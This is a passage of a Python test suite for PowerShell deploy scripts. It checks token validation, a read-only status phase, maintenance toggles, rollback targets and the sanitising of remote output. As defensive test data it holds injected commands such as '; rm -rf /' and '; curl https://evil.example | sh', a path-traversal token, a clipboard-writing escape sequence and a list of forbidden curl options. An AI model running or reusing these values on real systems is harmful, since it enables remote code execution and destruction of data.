        _assert_in_order(kept, f"mv {STAGING_DIR} {LIVE_DIR}", "curl -fsSL", 'echo "HOV_ASSET_SERVED=OK"', copy)
        lines = kept.splitlines()
        after = [line for line in lines[lines.index(copy) + 1:] if line.strip()]
        assert after == [f'echo "HOV_PREVIEW={PREVIEW_NAME}"', 'echo "HOV_MAINTENANCE=KEPT"'], after

    def test_a_malformed_token_is_refused_before_rendering(self, pwsh):
        # The token is spliced into the remote script, and the file name it
        # makes is the only thing keeping the preview private.
        cases = {
            f"'{PREVIEW_TOKEN}'": "rendered",
            "'0123456789abcdef'": "rendered",                     # 16: the floor
            "'0123456789abcde'": "refused",                       # 15
            f"'{PREVIEW_TOKEN.upper()}'": "refused",
            "'0123456789abcdeg'": "refused",
            f"'{PREVIEW_TOKEN}; rm -rf /'": "refused",
            "'../../index'": "refused",
            f"\"{PREVIEW_TOKEN}`n\"": "refused",                  # .NET's $ matches before a final newline
            f"'{'a' * 65}'": "refused",
            "''": "refused",
        }
        outcomes = _render_outcomes(f"New-SwapAndLiftScript -Chunk '{BUILT_CHUNK}' -PreviewToken $case", cases)
        assert dict(zip(cases, outcomes)) == cases

    def test_the_token_is_128_random_bits_new_every_time(self, pwsh):
        proc = _pwsh(DOT_SOURCE + "1..5 | ForEach-Object { \"TOKEN:$(New-PreviewToken)\" }\n", check=True)
        tokens = re.findall(r"^TOKEN:(.*)$", proc.stdout, re.M)
        assert len(tokens) == 5 and len(set(tokens)) == 5, tokens
        assert all(re.fullmatch(r"[0-9a-f]{32}", token) for token in tokens), tokens

    def test_no_file_the_build_ships_looks_like_a_preview(self, layout):
        # The stage reads any preview-*.html beside a parked index as "kept on
        # purpose", and -Maintenance Off deletes them all.
        glob = layout["PREVIEW_GLOB"]
        assert glob == "preview-*.html"
        assert not list((REPO_ROOT / "frontend" / "public").rglob(glob))


# ── -Status ──────────────────────────────────────────────────────────────────

#: Commands -Status may run.
READ_ONLY_COMMANDS = {
    "echo", "cd", "git", "systemctl", "curl", "docker", "sh", "grep", "head",
    "wc", "tr", "test", "command", "awk", "set", "cat", "printf", "ls",
}
#: What the commands that can also write may be asked to do.
ALLOWED_SUBCOMMANDS = {"git": {"rev-parse", "log", "status"}, "systemctl": {"is-active"}, "docker": {"exec"}}
FORBIDDEN_CURL_OPTIONS = {"-X", "--request", "-d", "--data", "--data-binary", "--data-raw", "-F", "--form",
                          "-T", "--upload-file", "-O", "--remote-name"}
SHELL_KEYWORDS = {"if", "then", "else", "elif", "fi", "!", "{", "}"}
#: A command substitution, a pipe or list operator, a subshell, a backtick.
COMMAND_BOUNDARY = r"\$\(|\)|\|\||&&|\||;|`|\n"
#: A redirection target (not the `2>&1` kind).
REDIRECT_TARGET = re.compile(r">\s*[\"']?(&\d|[^\s;|&)'\"]+)")


def _command_heads(script):
    """(command, rest) for every simple command in ``script``, crudely.

    `sh -c '...'` bodies are inlined and `docker exec <container> <cmd>` is
    unwrapped, so the commands run inside the container are seen too; awk
    programs are handed back separately; other single-quoted strings become an
    opaque word. Crude is fine: the caller allow-lists what it finds, so
    anything this misparses shows up as an unknown command and fails.
    """
    code = "\n".join(line for line in script.splitlines() if not line.lstrip().startswith("#"))
    awk_programs = re.findall(r"awk(?:\s+-v\s+\S+)*\s+'([^']*)'", code)
    code = re.sub(r"sh -c '([^']*)'", r"sh -c ; \1 ;", code)
    code = re.sub(r"'[^']*'", "QUOTED", code)
    heads = []
    for segment in re.split(COMMAND_BOUNDARY, code):
        words = segment.replace('"', " ").split()
        while words and (words[0] in SHELL_KEYWORDS or re.fullmatch(r"\w+=\S*", words[0])):
            words = words[1:]
        if not words:
            continue
        heads.append((words[0], words[1:]))
        if words[:2] == ["docker", "exec"] and len(words) > 3:
            heads.append((words[3], words[4:]))
    return heads, awk_programs


def _check_read_only(command, rest):
    assert command in READ_ONLY_COMMANDS, f"-Status runs {command!r} {rest}"
    if command in ALLOWED_SUBCOMMANDS:
        subcommand = next((word for word in rest if not word.startswith("-")), None)
        assert subcommand in ALLOWED_SUBCOMMANDS[command], f"-Status runs {command} {rest}"
    if command == "git":
        assert not any(word.startswith("--output") for word in rest), f"-Status runs git {rest}"
        if "status" in rest:
            # A plain `git status` refreshes the index: a write.
            assert "--no-optional-locks" in rest[:rest.index("status")], f"-Status runs git {rest}"
    if command == "sh":
        assert rest == ["-c"], f"-Status runs sh {rest}: only single-quoted `sh -c` bodies can be checked"
    if command == "command":
        assert rest[:1] == ["-v"], f"-Status runs command {rest}"
    if command == "curl":
        assert not FORBIDDEN_CURL_OPTIONS.intersection(rest), f"-Status runs curl {rest}"
        for i, word in enumerate(rest):
            if word == "-o":
                assert rest[i + 1:i + 2] == ["/dev/null"], f"-Status runs curl {rest}"


class TestTheStatusReport:
    def test_it_runs_only_read_only_commands(self, rendered):
        status = rendered["status"]
        heads, awk_programs = _command_heads(status)
        seen = {command for command, _ in heads}
        # Guard the guard: the parser has to be seeing the real commands.
        assert {"git", "docker", "curl", "systemctl", "awk", "grep", "cat"} <= seen, seen
        for command, rest in heads:
            _check_read_only(command, rest)
        assert awk_programs, "no awk program parsed"
        for program in awk_programs:
            assert not re.search(r"system|getline|>|\|", program), f"-Status's awk can write or run: {program}"
        for target in REDIRECT_TARGET.findall(status):
            assert target == "/dev/null" or target.startswith("&"), f"-Status writes to {target}"

    def test_it_prints_every_marker_the_script_reads_from_it(self, rendered, script_text):
        read = _markers_the_script_reads(script_text, "HOV_STATUS_")
        assert {"HOV_STATUS_BACKEND_SHA", "HOV_STATUS_LIVE_COMMIT", "HOV_STATUS_UNLIFTED_PROMOTE"} <= read, read
        for marker in read:
            assert f'echo "{marker}=' in rendered["status"], marker


def test_every_marker_the_deploy_reads_is_printed_by_some_phase(rendered, script_text):
    read = _markers_the_script_reads(script_text)
    assert {"HOV_PHASE", "HOV_PREV_SHA", "HOV_LIVE_COMMIT", "HOV_PROMOTED", "HOV_REFUSED"} <= read, read
    printed = "\n".join(rendered[phase] for phase in PHASES)
    for marker in read:
        assert f'"{marker}=' in printed, f"{marker} is read but no phase prints it"


# ── the manual toggle ────────────────────────────────────────────────────────


class TestTheManualMaintenanceToggle:
    def test_off_restores_a_parked_index_before_a_raise_s_save(self, rendered, layout):
        # Parked first: it belongs to the build in the directory by
        # construction; a save is whatever index.html was at some raise.
        off, saved, parked = rendered["off"], layout["SAVED"], layout["PARKED"]
        _assert_in_order(
            off,
            f"if [ -f {parked} ]; then mv {parked} index.html; ",
            f"elif [ -f {saved} ]; then mv {saved} index.html; ",
            'else echo "HOV_ERROR=no saved index to restore"; exit 1; fi',
            'echo "HOV_MAINTENANCE=OFF"',
        )

    def test_off_does_not_report_a_lift_that_restored_the_page(self, rendered, layout):
        _assert_in_order(
            rendered["off"],
            f"if grep -q {layout['MARKER']} index.html; then "
            'echo "HOV_ERROR=the restored index is the maintenance page"; exit 1; fi',
            'echo "HOV_MAINTENANCE=OFF"',
        )

    def test_off_closes_the_private_door_once_the_page_is_lifted(self, rendered, layout):
        # Only after a restore that proved to be the real index, and only in
        # the live directory the sh -c cd'd into.
        off = rendered["off"]
        _assert_in_order(
            off,
            f"cd {LIVE_DIR} && ",
            f"if grep -q {layout['MARKER']} index.html; then",
            f"fi && rm -f {layout['PREVIEW_GLOB']}'",
            'echo "HOV_MAINTENANCE=OFF"',
        )
        assert off.count("rm ") == 1, off

    def test_off_after_a_kept_deploy_restores_the_new_build_s_index(self, rendered, layout):
        # After a kept deploy the live directory is the promoted build: its
        # parked index is the one the swap proved names this run's chunk, and
        # nothing left it; no saved index lives there, because the stage's
        # save went to .prev with the previous build and was restored there.
        # (A raise before the deploy -- the cutover's order -- saved into the
        # same previous build.) So Off restores the new build's index.
        kept, stage, off = rendered["kept"], rendered["stage"], rendered["off"]
        parked, saved = layout["PARKED"], layout["SAVED"]
        assert f'grep -oE "{layout["CHUNK_PATTERN"]}" {LIVE_DIR}/{parked} | head -n 1' in kept
        assert re.search(r"\b(mv|rm)\b[^\n;&|]*" + re.escape(f"{LIVE_DIR}/{parked}"), kept) is None
        # Every saved index the stage and the kept swap name, by full path,
        # is the previous build's by the time the promote is done.
        for text in (stage, kept):
            assert f"{STAGING_DIR}/{saved}" not in text
        assert f"mv {LIVE_DIR} {PREVIOUS_DIR}" in kept
        saved_in_live = [m.group(0) for m in re.finditer(re.escape(LIVE_DIR) + r"(?![.\w])/" + re.escape(saved), kept)]
        assert saved_in_live == [], saved_in_live
        # The stage's raise saves into the live directory it later renames.
        assert f"cd {LIVE_DIR} && {{ [ -f {saved} ]" in stage
        # And Off takes a parked index first, whatever else is there.
        assert off.index(f"if [ -f {parked} ]; then mv {parked} index.html;") < off.index(f"[ -f {saved} ]")


# ── the PowerShell around the scripts ────────────────────────────────────────

#: Stubs for everything Invoke-Deploy does besides deciding. Each prints a
#: CALL line, so tests pin what ran and in what order. A remote phase is
#: keyed off the rendered script's own HOV_PHASE line and answers from
#: $global:Remote (Exit -1 makes the connection throw); each public API check
#: pops $global:ApiResults (an empty queue throws: an error nobody planned
#: for); each index probe pops $global:IndexResults (empty: found).
DEPLOY_HARNESS = r"""
function Assert-CheckoutIsOriginMaster { Write-Host 'CALL:gate'; '__SHA__' }
function Build-Frontend { Write-Host 'CALL:build' }
function Assert-BuiltFrom { param($Sha) Write-Host 'CALL:built-from' }
function Get-LocalMainChunk { '__CHUNK__' }
function Send-Build { Write-Host 'CALL:upload' }
function Find-InPublicIndex {
    param($Needle, $Attempts, $DelaySeconds, $TimeoutSec)
    Write-Host "CALL:index:$Needle"
    $found = if ($global:IndexResults.Count) { $global:IndexResults.Dequeue() } else { $true }
    [pscustomobject]@{ Found = $found; Problem = $null }
}
function Get-PublicApiStatus {
    $ok = $global:ApiResults.Dequeue()
    Write-Host "CALL:api:$ok"
    [pscustomobject]@{ Ok = $ok; Detail = 'stub' }
}
function Invoke-RemoteScript {
    param($Script)
    $phase = if ($Script -cmatch 'HOV_PHASE=(\w+)') { $Matches[1] } else { 'unknown' }
    if (-not $global:Remote.ContainsKey($phase)) { throw "no scripted answer for phase '$phase'" }
    # The kept swap is the same phase; its call is labelled so a test sees
    # which variant was sent, and the preview it names.
    if ($Script.Contains('echo "HOV_MAINTENANCE=KEPT"')) {
        if ($Script -cmatch 'echo "HOV_PREVIEW=(\S+)"') { Write-Host "SENT-PREVIEW:$($Matches[1])" }
        Write-Host "CALL:$phase-kept"
    } else {
        Write-Host "CALL:$phase"
    }
    $answer = $global:Remote[$phase]
    if ($answer.Exit -eq -1) { throw 'stub: connection reset mid-phase' }
    $global:LASTEXITCODE = $answer.Exit
    return ,[string[]]$answer.Lines
}
"""

PhaseAnswer = collections.namedtuple("PhaseAnswer", "exit lines")


def _stage_lines(live=PREV_SHA, page_was_up="no", prev=PREV_SHA, maintenance="ON", health="OK"):
    """What the stage prints, in its order, up to where it stopped."""
    lines = ["HOV_PHASE=stage", f"HOV_LIVE_COMMIT={live}", f"HOV_PAGE_WAS_UP={page_was_up}", f"HOV_PREV_SHA={prev}"]
    if maintenance:
        lines.append(f"HOV_MAINTENANCE={maintenance}")
    if health:
        lines.append(f"HOV_BACKEND_HEALTH={health}")
    return lines


GREEN_STAGE = PhaseAnswer(0, _stage_lines())
STAGE_HEALTH_FAILED = PhaseAnswer(1, _stage_lines(health="FAIL"))
GREEN_SWAP = PhaseAnswer(0, ["HOV_PHASE=swap", "HOV_PROMOTED=yes", f"HOV_NEW_CHUNK={BUILT_CHUNK}",
                             "HOV_ASSET_SERVED=OK", "HOV_MAINTENANCE=OFF"])
LOCAL_STEPS = ["gate", "build", "built-from", "upload"]
TO_THE_SWAP = LOCAL_STEPS + ["stage", "api:True", "index:data-hov-maintenance", "swap"]


def _deploy(stage=GREEN_STAGE, swap=GREEN_SWAP, api=(True, True), index=(), prelude="", keep=False):
    """Run the real Invoke-Deploy against scripted remote answers: the calls
    it made (``CALL:`` lines), its output and its exit code."""
    script = (
        DOT_SOURCE
        + DEPLOY_HARNESS.replace("__SHA__", FAKE_SHA).replace("__CHUNK__", BUILT_CHUNK)
        + "$global:ApiResults = [System.Collections.Queue]::new()\n"
        + "".join(f"$global:ApiResults.Enqueue({_ps_bool(ok)})\n" for ok in api)
        + "$global:IndexResults = [System.Collections.Queue]::new()\n"
        + "".join(f"$global:IndexResults.Enqueue({_ps_bool(found)})\n" for found in index)
        + "$global:Remote = @{\n"
        + f"  stage = @{{ Exit = {stage.exit}; Lines = {_ps_lines(stage.lines)} }}\n"
        + f"  swap  = @{{ Exit = {swap.exit}; Lines = {_ps_lines(swap.lines)} }}\n"
        + "}\n"
        + prelude
        # As the script's own top level runs Main: an escaping error exits 1.
        + f"try {{ Invoke-Deploy{' -KeepMaintenance' if keep else ''} }} catch {{ Write-Host \"$_\"; exit 1 }}\n"
    )
    proc = _pwsh(script)
    calls = re.findall(r"^CALL:(\S+)", proc.stdout, re.M)
    return calls, proc.stdout + proc.stderr, proc.returncode


@pytest.mark.usefixtures("pwsh")
class TestTheDeployStopsOnRed:
    """The operator's red-state decisions (docs/development/deployment.md):
    stay in maintenance and stop on red, no automatic rollback; public HTTPS
    is the gate; nothing is lifted on a claim; every way out keeps frontend
    and backend on the same commit, backend first."""

    def test_green_runs_every_step_in_order_and_says_so(self):
        calls, output, code = _deploy()
        assert code == 0, output
        assert calls == TO_THE_SWAP + ["api:True", f"index:{BUILT_CHUNK}"], output
        assert COMPLETE in output, output
        assert INTERRUPTED not in output and UNKNOWN_STATE not in output, output

    def test_a_failed_stage_stops_before_the_public_check_and_the_swap(self):
        calls, output, code = _deploy(stage=STAGE_HEALTH_FAILED)
        assert code == 1, output
        assert calls == LOCAL_STEPS + ["stage"], output
        assert RAISED_HEADLINE in output, output
        # One state, one help: the `finally` must not add the Unknown one.
        assert UNKNOWN_STATE not in output, output
        # Going back: the backend first, seen answering, and only then the
        # lift that shows players the previous frontend again.
        _assert_in_order(output, RERUN, _rollback_line(PREV_SHA), BACKEND_OK_GATE, LIFT)

    def test_a_stage_that_failed_before_the_raise_never_offers_a_lift(self):
        calls, output, code = _deploy(stage=PhaseAnswer(1, _stage_lines(maintenance=None, health=None)))
        assert code == 1, output
        assert NOT_RAISED_HEADLINE in output and RERUN in output, output
        assert LIFT not in output, output

    def test_a_script_that_will_not_render_stops_the_deploy_before_the_upload(self):
        # Both remote scripts are rendered before anything reaches the server,
        # so a refusal from either one leaves production as it was.
        for prelude in (
            "$RemoteValues['CONTAINER'] = \"webserver`r\"\n",                          # the first render refuses
            "function New-SwapAndLiftScript { param($Chunk) throw 'refused' }\n",      # only the second one does
        ):
            calls, output, code = _deploy(prelude=prelude)
            assert code == 1, output
            assert calls == LOCAL_STEPS[:-1], output
            assert INTERRUPTED not in output, output

    def test_a_connection_that_never_ran_the_stage_changed_nothing(self):
        calls, output, code = _deploy(stage=PhaseAnswer(SSH_CONNECTION_LOST, []))
        assert code == 1, output
        assert NOT_RAISED_HEADLINE in output and UNKNOWN_STATE not in output, output

    def test_a_failed_public_check_is_the_gate(self):
        calls, output, code = _deploy(api=(False,))
        assert code == 1, output
        assert calls == LOCAL_STEPS + ["stage", "api:False"], output
        assert "Not lifting maintenance" in output, output
        _assert_in_order(output, _rollback_line(PREV_SHA), BACKEND_OK_GATE, LIFT)

    def test_a_failed_public_check_on_a_first_deploy_says_what_it_held_back(self):
        calls, output, code = _deploy(stage=PhaseAnswer(0, _stage_lines(live="NONE", maintenance="NO_LIVE_INDEX")), api=(False,))
        assert code == 1, output
        assert "Not promoting." in output and NOT_RAISED_HEADLINE in output, output

    def test_it_refuses_to_promote_over_an_unlifted_promote(self):
        calls, output, code = _deploy(stage=PhaseAnswer(1, ["HOV_PHASE=stage", "HOV_REFUSED=UNLIFTED_PROMOTE"]))
        assert code == 1, output
        assert calls == LOCAL_STEPS + ["stage"], output
        assert "Refused" in output and PROMOTED_HEADLINE in output, output
        assert FRONTEND_ROLLBACK in output, output

    @pytest.mark.parametrize("refusal, why", [
        ("LIVE_IS_MOUNTPOINT", "is a mount point"),
        ("HOST_CANNOT_REACH_PUBLIC", "cannot reach"),
    ])
    def test_a_refusal_before_the_window_changed_nothing(self, refusal, why):
        calls, output, code = _deploy(stage=PhaseAnswer(1, ["HOV_PHASE=stage", f"HOV_REFUSED={refusal}"]))
        assert code == 1, output
        assert calls == LOCAL_STEPS + ["stage"], output
        assert "Refused before anything changed" in output and why in output, output
        assert NOT_RAISED_HEADLINE in output, output

    @pytest.mark.parametrize("lines", [
        ["HOV_PHASE=swap", "mv: cannot move 'HeartOfVirtue': Device or resource busy"],
        ["HOV_PHASE=swap", "HOV_NEW_CHUNK=MISMATCH (staged)"],
    ], ids=["rename-failed", "staged-build-not-ours"])
    def test_a_swap_that_failed_before_the_promote_keeps_the_previous_frontend(self, lines):
        calls, output, code = _deploy(swap=PhaseAnswer(1, lines))
        assert code == 1, output
        assert calls == TO_THE_SWAP, output
        assert RAISED_HEADLINE in output, output
        assert f"rm -rf {LIVE_DIR}" not in output, output
        _assert_in_order(output, _rollback_line(PREV_SHA), LIFT)

    def test_a_swap_that_failed_after_the_promote_offers_both_ways_out(self):
        calls, output, code = _deploy(swap=PhaseAnswer(1, [
            "HOV_PHASE=swap", "HOV_PROMOTED=yes", f"HOV_NEW_CHUNK={BUILT_CHUNK}", "HOV_ASSET_SERVED=WRONG_TYPE (text/html)",
        ]))
        assert code == 1, output
        assert calls == TO_THE_SWAP, output
        assert PROMOTED_HEADLINE in output, output
        # Keep the new release (both new), or go back backend-first (both old).
        _assert_in_order(output, LIFT, _rollback_line(PREV_SHA), BACKEND_OK_GATE, FRONTEND_ROLLBACK)

    def test_a_promoted_build_that_is_not_this_run_s_is_never_offered_for_keeping(self):
        calls, output, code = _deploy(swap=PhaseAnswer(1, [
            "HOV_PHASE=swap", "HOV_PROMOTED=yes", "HOV_NEW_CHUNK=MISMATCH (promoted: assets/index-Other.js)",
        ]))
        assert code == 1, output
        assert FOREIGN_HEADLINE in output, output
        assert LIFT not in output, output
        _assert_in_order(output, _rollback_line(PREV_SHA), BACKEND_OK_GATE, FRONTEND_ROLLBACK)

    @pytest.mark.parametrize("answers", [
        {"stage": PhaseAnswer(SSH_CONNECTION_LOST, _stage_lines(maintenance=None, health=None))},
        {"swap": PhaseAnswer(SSH_CONNECTION_LOST, ["HOV_PHASE=swap"])},
        {"swap": PhaseAnswer(SSH_CONNECTION_LOST, ["HOV_PHASE=swap", "HOV_PROMOTED=yes"])},
        {"swap": PhaseAnswer(-1, [])},
    ], ids=["stage", "swap", "swap-after-promote", "swap-threw"])
    def test_a_phase_cut_off_mid_way_says_the_state_is_unknown(self, answers):
        # Once a phase has started, the server may carry on without us:
        # guessing the state from the markers that happened to arrive would
        # print the wrong way out.
        calls, output, code = _deploy(**answers)
        assert code == 1, output
        assert UNKNOWN_STATE in output and STATUS_FIRST in output, output
        for headline in (RAISED_HEADLINE, NOT_RAISED_HEADLINE, PROMOTED_HEADLINE):
            assert headline not in output, (headline, output)

    def test_a_connection_lost_after_the_stage_reported_health_carries_on(self):
        calls, output, code = _deploy(stage=PhaseAnswer(SSH_CONNECTION_LOST, _stage_lines()))
        assert code == 0, output
        assert "reported the backend healthy and then exited non-zero" in output and COMPLETE in output, output

    def test_a_connection_lost_after_the_lift_is_not_reported_as_before_it(self):
        calls, output, code = _deploy(swap=GREEN_SWAP._replace(exit=SSH_CONNECTION_LOST))
        assert code == 0, output
        assert "lifted the page and then exited non-zero" in output and COMPLETE in output, output
        assert INTERRUPTED not in output, output

    def test_an_error_between_phases_prints_the_state_last_observed(self):
        # The public-check stub throws on an empty queue, after the raise.
        calls, output, code = _deploy(api=())
        assert code == 1, output
        assert "swap" not in calls, output
        assert INTERRUPTED in output and RAISED_HEADLINE in output, output
        assert UNKNOWN_STATE not in output, output

    def test_an_error_after_the_lift_says_the_release_is_live(self):
        # The post-lift check's stub throws on the empty queue.
        calls, output, code = _deploy(api=(True,))
        assert code == 1, output
        assert INTERRUPTED in output and "already lifted" in output, output
        for headline in (RAISED_HEADLINE, PROMOTED_HEADLINE, UNKNOWN_STATE):
            assert headline not in output, (headline, output)

    def test_a_failing_api_after_the_lift_is_not_reported_green(self):
        calls, output, code = _deploy(api=(True, False))
        assert code == 1, output
        assert calls == TO_THE_SWAP + ["api:False", f"index:{BUILT_CHUNK}"], output
        assert COMPLETE not in output, output
        # Page back up first, then go back backend-first.
        _assert_in_order(output, RAISE, _rollback_line(PREV_SHA), BACKEND_OK_GATE, FRONTEND_ROLLBACK)

    def test_a_stale_public_index_after_the_lift_is_a_warning(self):
        calls, output, code = _deploy(index=(True, False))
        assert code == 0, output
        assert f"does not yet reference {BUILT_CHUNK}" in output and COMPLETE in output, output

    def test_the_help_prints_under_inherited_stop_preferences(self):
        # A profile or a calling script can set these; a Write-Error on the
        # red path would then end the run before the recovery help printed.
        # (The native-command half is exercised in TestTheRemoteOutputBoundary.)
        calls, output, code = _deploy(
            stage=STAGE_HEALTH_FAILED,
            prelude="$ErrorActionPreference = 'Stop'\n$PSNativeCommandUseErrorActionPreference = $true\n",
        )
        assert code == 1, output
        assert LIFT in output, output


GREEN_KEPT_SWAP = PhaseAnswer(0, ["HOV_PHASE=swap", "HOV_PROMOTED=yes", f"HOV_NEW_CHUNK={BUILT_CHUNK}",
                                  "HOV_ASSET_SERVED=OK", f"HOV_PREVIEW={PREVIEW_NAME}", "HOV_MAINTENANCE=KEPT"])
TO_THE_KEPT_SWAP = TO_THE_SWAP[:-1] + ["swap-kept"]
PREVIEW_URL = re.compile(re.escape(PUBLIC_BASE) + r"/preview-([0-9a-f]{32})\.html")
KEPT_CAVEAT = "A reload or a sign-out lands on the maintenance page again"


@pytest.mark.usefixtures("pwsh")
class TestTheKeptDeploy:
    """-KeepMaintenance: the same deploy up to the proof that the bundle is
    served, then the page stays up and the operator gets a private URL."""

    def test_green_sends_the_kept_swap_skips_the_post_lift_checks_and_says_how_to_lift(self):
        # One API answer only: a post-lift check would dequeue a second and
        # throw on the empty queue.
        calls, output, code = _deploy(swap=GREEN_KEPT_SWAP, api=(True,), keep=True)
        assert code == 0, output
        assert calls == TO_THE_KEPT_SWAP, output
        assert f"index:{BUILT_CHUNK}" not in calls, output
        sent = re.findall(r"^SENT-PREVIEW:(\S+)", output, re.M)
        printed = PREVIEW_URL.findall(output)
        # The URL printed is the file the script it sent creates.
        assert len(sent) == 1 and printed and set(printed) == {sent[0][len("preview-"):-len(".html")]}, output
        _assert_in_order(output, PREVIEW_URL.search(output).group(0), KEPT_CAVEAT, LIFT)
        assert COMPLETE not in output and INTERRUPTED not in output, output

    def test_a_token_is_new_on_every_run(self):
        runs = [_deploy(swap=GREEN_KEPT_SWAP, api=(True,), keep=True)[1] for _ in range(2)]
        first, second = (re.findall(r"^SENT-PREVIEW:(\S+)", output, re.M) for output in runs)
        assert first and second and first != second

    def test_without_the_switch_the_default_swap_is_sent_and_checked_after_the_lift(self):
        calls, output, code = _deploy()
        assert code == 0, output
        assert "swap-kept" not in calls and "SENT-PREVIEW" not in output, output
        assert calls[-2:] == ["api:True", f"index:{BUILT_CHUNK}"], output

    def test_it_offers_the_way_back_too(self):
        calls, output, code = _deploy(swap=GREEN_KEPT_SWAP, api=(True,), keep=True)
        _assert_in_order(output, LIFT, _rollback_line(PREV_SHA), BACKEND_OK_GATE, FRONTEND_ROLLBACK)

    def test_a_connection_lost_after_the_preview_carries_on(self):
        calls, output, code = _deploy(swap=GREEN_KEPT_SWAP._replace(exit=SSH_CONNECTION_LOST), api=(True,), keep=True)
        assert code == 0, output
        assert "placed the preview and then exited non-zero" in output and PREVIEW_URL.search(output), output

    def test_a_kept_swap_that_failed_after_the_promote_is_promoted_not_kept(self):
        calls, output, code = _deploy(swap=PhaseAnswer(1, [
            "HOV_PHASE=swap", "HOV_PROMOTED=yes", f"HOV_NEW_CHUNK={BUILT_CHUNK}", "HOV_ASSET_SERVED=WRONG_TYPE (text/html)",
        ]), api=(True,), keep=True)
        assert code == 1, output
        assert calls == TO_THE_KEPT_SWAP and PROMOTED_HEADLINE in output, output
        assert not PREVIEW_URL.search(output), output

    def test_a_deploy_over_a_kept_build_is_refused_with_the_ways_out(self):
        # The kept build is not "known to work" -- that is what the private
        # test is for -- and promoting over it would delete .prev, the last
        # release players had.
        for keep in (False, True):
            calls, output, code = _deploy(stage=PhaseAnswer(1, ["HOV_PHASE=stage", "HOV_REFUSED=KEPT_FOR_PREVIEW"]), keep=keep)
            assert code == 1, output
            assert calls == LOCAL_STEPS + ["stage"], output
            assert "Refused: a -KeepMaintenance deploy is behind the page" in output and PROMOTED_HEADLINE in output, output
            _assert_in_order(output, LIFT, FRONTEND_ROLLBACK)
            assert "stopped before the lift" not in output, output


@pytest.mark.usefixtures("pwsh")
class TestTheRollbackTarget:
    """The backend a rollback restores must be the one that matches the
    frontend it restores -- and it lands in a command pasted with sudo."""

    @pytest.mark.parametrize("stage, expected", [
        # The live build's stamped commit wins, even on a re-run whose HEAD
        # was already moved by an earlier, failed run.
        (_stage_lines(live=OTHER_SHA, page_was_up="yes", prev=FAKE_SHA, health="FAIL"), OTHER_SHA),
        # No stamp (a build from before stamping), no page up: the HEAD at the start.
        (_stage_lines(live="NONE", page_was_up="no", prev=PREV_SHA, health="FAIL"), PREV_SHA),
    ], ids=["stamped", "unstamped"])
    def test_it_names_the_commit_of_the_frontend_it_restores(self, stage, expected):
        calls, output, code = _deploy(stage=PhaseAnswer(1, stage))
        assert _rollback_line(expected) in output, output
        for other in {FAKE_SHA, PREV_SHA, OTHER_SHA} - {expected}:
            assert _rollback_line(other) not in output, (other, output)

    @pytest.mark.parametrize("stage, why", [
        (_stage_lines(live="NONE", page_was_up="yes", prev=PREV_SHA, health="FAIL"), "already up"),
        (_stage_lines(live="NONE", page_was_up="no", prev=FAKE_SHA, health="FAIL"), "already on this commit"),
        (_stage_lines(live=FAKE_SHA, page_was_up="no", prev=FAKE_SHA, health="FAIL"), "re-deploy"),
    ], ids=["page-was-up", "re-run", "re-deploy"])
    def test_when_it_cannot_name_one_it_says_why_and_points_at_the_reflog(self, stage, why):
        calls, output, code = _deploy(stage=PhaseAnswer(1, stage))
        assert "git reset --hard" not in output, output
        assert why in output and "reflog" in output, output

    @pytest.mark.parametrize("answers", [
        {"stage": "hostile-stage"},
        {"api": (False,)},
        {"swap": PhaseAnswer(1, ["HOV_PHASE=swap", "HOV_PROMOTED=yes", f"HOV_NEW_CHUNK={BUILT_CHUNK}"])},
        {"api": (True, False)},
        {"api": ()},
    ], ids=["raised", "gate", "promoted", "lifted", "interrupted"])
    def test_text_that_is_not_a_commit_id_never_reaches_the_command(self, answers):
        hostile = f"{PREV_SHA}; curl https://evil.example | sh"
        stage = PhaseAnswer(0, _stage_lines(live=hostile, prev=hostile))
        if answers.get("stage") == "hostile-stage":
            answers = {"stage": PhaseAnswer(1, _stage_lines(live=hostile, prev=hostile, health="FAIL"))}
        else:
            answers = {"stage": stage, **answers}
        calls, output, code = _deploy(**answers)
        assert code == 1, output
        assert "evil.example" not in output and "git reset --hard" not in output, output
        assert "reflog" in output, output

    def test_two_different_values_mean_neither_is_trusted(self):
        lines = _stage_lines(live="NONE", prev=PREV_SHA, health="FAIL")
        lines.insert(1, f"HOV_PREV_SHA={OTHER_SHA}")
        calls, output, code = _deploy(stage=PhaseAnswer(1, lines))
        assert code == 1, output
        assert "git reset --hard" not in output and "reflog" in output, output
        assert "already on this commit" not in output, output


@pytest.mark.usefixtures("pwsh")
class TestTheRemoteOutputBoundary:
    """What comes back from ssh or the public site is echoed to the terminal
    the operator pastes sudo commands from, and parsed for markers."""

    def test_a_failing_native_command_never_throws_out_of_invoke_remote(self):
        proc = _pwsh(
            DOT_SOURCE
            + f"""
$ErrorActionPreference = 'Stop'
$PSNativeCommandUseErrorActionPreference = $true
try {{ $null = Invoke-Remote -Exe {_ps_literal(PWSH)} -Arguments @('-NoProfile', '-Command', 'exit 3'); "RESULT:returned:$LASTEXITCODE" }}
catch {{ "RESULT:threw:$($_.Exception.Message)" }}
"""
        )
        assert "RESULT:returned:3" in proc.stdout, proc.stdout + proc.stderr

    def test_escape_sequences_in_remote_output_are_neutralised(self):
        # OSC 52 (ESC ] 52;c;<base64> BEL) writes the operator's clipboard --
        # the paste-a-sudo-command attack -- on both of the remote's streams.
        emit = (
            "[Console]::Out.Write([char]27 + ']52;c;ZXZpbA==' + [char]7 + 'HOV_A=1' + [char]10);"
            "[Console]::Error.Write([char]27 + '[31m' + 'HOV_B=2' + [char]10)"
        )
        proc = _pwsh(
            DOT_SOURCE
            + "$PSStyle.OutputRendering = 'Ansi'\n"
            + f"$lines = Invoke-Remote -Exe {_ps_literal(PWSH)} -Arguments @('-NoProfile', '-Command', {_ps_literal(emit)})\n"
            + "'RESULT:' + ($lines -join '|')\n",
            check=True,
        )
        assert "\x1b" not in proc.stdout and "\x07" not in proc.stdout, repr(proc.stdout)
        assert "?]52;c;ZXZpbA==?HOV_A=1" in proc.stdout and "?[31mHOV_B=2" in proc.stdout, repr(proc.stdout)

    def test_c1_controls_and_format_characters_are_neutralised_too(self):
        # A C1 CSI and a bidi override, which a process boundary's encoding
        # could mangle, checked on the function itself. Tab survives.
        proc = _pwsh(
            DOT_SOURCE
            + "$text = Format-RemoteText ([string][char]0x9B + 'a' + [char]0x202E + 'b' + [char]9 + 'c')\n"
            + "'RESULT:' + (($text.ToCharArray() | ForEach-Object { [int]$_ }) -join ',')\n",
            check=True,
        )
        assert "RESULT:63,97,63,98,9,99" in proc.stdout, proc.stdout

    def test_the_real_invoke_remote_script_cleans_and_keeps_the_exit_code(self):
        proc = _pwsh(
            DOT_SOURCE
            + r"""
